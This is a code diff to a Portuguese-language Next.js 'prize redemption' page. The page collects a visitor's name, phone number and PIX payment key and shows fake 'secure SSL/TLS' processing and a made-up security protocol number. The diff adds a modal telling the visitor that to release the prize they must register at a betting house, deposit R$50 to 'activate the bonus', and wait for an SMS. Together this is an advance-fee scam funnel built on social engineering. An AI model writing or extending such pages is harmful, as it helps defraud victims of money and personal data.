@@ -1,15 +1,14 @@
-
 'use client';
 
 import React, { useState, useEffect } from 'react';
 import { Cinzel, Inter } from 'next/font/google';
 import { cn } from '@/lib/utils';
-import { Lock, CreditCard, CheckCircle2, AlertCircle } from 'lucide-react';
+import { Lock, CreditCard, CheckCircle2, AlertCircle, UserPlus, Wallet2, MessageSquare } from 'lucide-react';
 
 const cinzel = Cinzel({ subsets: ['latin'], variable: '--font-cinzel' });
 const inter = Inter({ subsets: ['latin'], variable: '--font-inter' });
 
-type FlowStep = 'form' | 'processing' | 'blocked';
+type FlowStep = 'form' | 'processing' | 'blocked' | 'steps';
 
 const PROCESSING_STEPS = [
   "Inicializando conexão segura SSL/TLS...",
@@ -123,7 +122,7 @@ export default function ResgatarPage() {
             
             <form onSubmit={handleSubmit} className="p-5 flex flex-col gap-3.5">
               <div className="space-y-1.5">
-                <label className="font-cinzel text-[9px] tracking-[0.25em] uppercase font-bold text-[#3E2606]">Nome completo</label>
+                <label className="font-cinzel text-[9px] tracking-[0.25em] uppercase font-bold text-[#7A5010]">Nome completo</label>
                 <input 
                   type="text" 
                   placeholder="Seu nome completo"
@@ -134,7 +133,7 @@ export default function ResgatarPage() {
               </div>
 
               <div className="space-y-1.5">
-                <label className="font-cinzel text-[9px] tracking-[0.25em] uppercase font-bold text-[#3E2606]">Telefone</label>
+                <label className="font-cinzel text-[9px] tracking-[0.25em] uppercase font-bold text-[#7A5010]">Telefone</label>
                 <input 
                   type="tel" 
                   placeholder="(00) 00000-0000"
@@ -145,7 +144,7 @@ export default function ResgatarPage() {
               </div>
 
               <div className="space-y-1.5">
-                <label className="font-cinzel text-[9px] tracking-[0.25em] uppercase font-bold text-[#3E2606]">Chave PIX</label>
+                <label className="font-cinzel text-[9px] tracking-[0.25em] uppercase font-bold text-[#7A5010]">Chave PIX</label>
                 <input 
                   type="text" 
                   placeholder="CPF, e-mail ou aleatória"
@@ -293,13 +292,81 @@ export default function ResgatarPage() {
               </div>
 
               <button 
-                onClick={() => window.location.href = '#'}
+                onClick={() => setFlowStep('steps')}
                 className="w-full h-14 rounded-full bg-[#D32F2F] text-white font-cinzel text-[13px] font-bold uppercase tracking-[0.15em] shadow-[0_8px_25px_rgba(211,47,47,0.4)] hover:scale-[1.02] active:scale-[0.98] transition-all"
               >
                 Liberar Prêmio Agora
               </button>
               
               <p className="mt-6 text-[10px] text-[#8B5E1F]/60 font-medium tracking-wide">Protocolo de Segurança: #AUR-2024-9981</p>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {flowStep === 'steps' && (
+        <div className="fixed inset-0 z-[120] flex items-center justify-center p-4 bg-black/90 backdrop-blur-xl animate-in fade-in duration-700">
+          <div className="w-full max-w-[340px] bg-[#FEFAF4] rounded-[32px] shadow-[0_40px_80px_rgba(0,0,0,0.7)] overflow-hidden animate-in zoom-in-95 duration-700">
+            <div className="h-2 w-full bg-gradient-to-r from-[#F5D37A] via-[#D4A24C] to-[#8B5E1F]" />
+            <div className="p-8">
+              <div className="text-center mb-8">
+                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-[#D4A24C]/30 bg-[#FFF8EC] text-[#8B5E1F] mb-4">
+                  <Lock className="w-3 h-3" />
+                  <span className="font-cinzel text-[9px] tracking-[0.2em] uppercase font-bold">Protocolo de Liberação</span>
+                </div>
+                <h2 className="font-cinzel text-xl font-black text-[#2A1205] uppercase tracking-tight">Como Liberar seu Prêmio</h2>
+              </div>
+
+              <div className="space-y-6 mb-10">
+                {/* Passo 1 */}
+                <div className="flex gap-4">
+                  <div className="flex-shrink-0 w-10 h-10 rounded-full bg-[#FFF8EC] border-2 border-[#D4A24C] flex items-center justify-center">
+                    <UserPlus className="w-5 h-5 text-[#C49A28]" />
+                  </div>
+                  <div className="space-y-1">
+                    <h4 className="font-cinzel text-[10px] font-bold text-[#8B5E1F] uppercase tracking-wide">1º Passo</h4>
+                    <p className="text-[12px] text-[#2A1205]/90 leading-relaxed">
+                      Para confirmar que você é uma pessoa real, precisamos que <strong className="text-[#2A1205]">cadastre-se na casa</strong> e verifique sua conta.
+                    </p>
+                  </div>
+                </div>
+
+                {/* Passo 2 */}
+                <div className="flex gap-4">
+                  <div className="flex-shrink-0 w-10 h-10 rounded-full bg-[#FFF8EC] border-2 border-[#D4A24C] flex items-center justify-center">
+                    <Wallet2 className="w-5 h-5 text-[#C49A28]" />
+                  </div>
+                  <div className="space-y-1">
+                    <h4 className="font-cinzel text-[10px] font-bold text-[#8B5E1F] uppercase tracking-wide">2º Passo Essencial</h4>
+                    <p className="text-[12px] text-[#2A1205]/90 leading-relaxed">
+                      Realizar um depósito de <strong className="text-[#2A1205]">R$ 50 reais</strong> na casa para ativação do bônus.
+                    </p>
+                  </div>
+                </div>
+
+                {/* Passo 3 */}
+                <div className="flex gap-4">
+                  <div className="flex-shrink-0 w-10 h-10 rounded-full bg-[#FFF8EC] border-2 border-[#D4A24C] flex items-center justify-center">
+                    <MessageSquare className="w-5 h-5 text-[#C49A28]" />
+                  </div>
+                  <div className="space-y-1">
+                    <h4 className="font-cinzel text-[10px] font-bold text-[#8B5E1F] uppercase tracking-wide">3º Passo</h4>
+                    <p className="text-[12px] text-[#2A1205]/90 leading-relaxed">
+                      Você irá receber um <strong className="text-[#2A1205]">SMS</strong> da nossa equipe para resgatar o prêmio em até <strong className="text-[#2A1205]">48hs</strong>.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              <button 
+                onClick={() => window.location.href = '#'}
+                className="w-full h-14 rounded-2xl bg-gradient-to-r from-[#D4A24C] to-[#8B5E1F] text-[#FFF8EC] font-cinzel text-[13px] font-bold uppercase tracking-[0.15em] shadow-[0_8px_25px_rgba(212,162,76,0.4)] hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-3"
+              >
+                Começar Verificação
+                <CheckCircle2 className="w-5 h-5" />
+              </button>
+              
+              <p className="text-center text-[10px] text-[#8B5E1F]/60 mt-6 font-medium">Siga os passos acima para garantir o recebimento</p>
             </div>
           </div>
         </div>
@@ -320,4 +387,3 @@ export default function ResgatarPage() {
     </main>
   );
 }
-
